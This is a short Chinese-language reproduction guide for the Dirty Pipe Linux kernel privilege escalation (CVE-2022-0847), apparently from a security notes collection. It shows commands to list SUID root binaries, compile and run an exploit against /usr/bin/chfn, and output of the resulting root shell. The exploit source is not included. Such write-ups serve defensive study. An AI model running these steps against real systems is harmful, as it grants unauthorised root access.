# 漏洞描述

CVE-2022-0847-DirtyPipe-Exploit CVE-2022-0847 是存在于 Linux内核 5.8 及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe”

# 漏洞影响

Linux内核 5.8 及之后版本

# 漏洞复现

查找具有suid权限的可执行文件

```shell
find / -user root -perm /4000 2>/dev/null

find / -user root -perm /4000 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/virtualbox/VBoxNetDHCP
/usr/lib/virtualbox/VBoxSDL
/usr/lib/virtualbox/VBoxNetAdpCtl
/usr/lib/virtualbox/VBoxNetNAT
/usr/lib/virtualbox/VirtualBoxVM
/usr/lib/virtualbox/VBoxHeadless
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
^[[B^[[B^[[B^[[B^[[B^[[B/usr/bin/chsh
/usr/bin/kismet_cap_rz_killerbee
/usr/bin/kismet_cap_nrf_52840
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/ntfs-3g
/usr/bin/kismet_cap_ti_cc_2540
/usr/bin/fusermount3
/usr/bin/kismet_cap_ubertooth_one
/usr/bin/vmware-user-suid-wrapper
/usr/bin/kismet_cap_nrf_mousejack
/usr/bin/kismet_cap_ti_cc_2531
/usr/bin/chfn
/usr/bin/kismet_cap_nxp_kw41z
/usr/bin/passwd
/usr/bin/su
/usr/bin/kismet_cap_linux_wifi
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/kismet_cap_nrf_51822
/usr/bin/kismet_cap_linux_bluetooth
/usr/bin/umount
/usr/sbin/mount.cifs
/usr/sbin/pppd
/usr/sbin/mount.nfs

```

编译POC文件后，指定修改的Suid可执行文件，获取root权限 

```
gcc cve-2022-0847.c -o cve-2022-0847

./cve-2022-0847 /usr/bin/chfn

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# id
uid=0(root) gid=0(root) groups=0(root),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),120(wireshark),134(scanner),142(kaboxer),1000(kali)

```

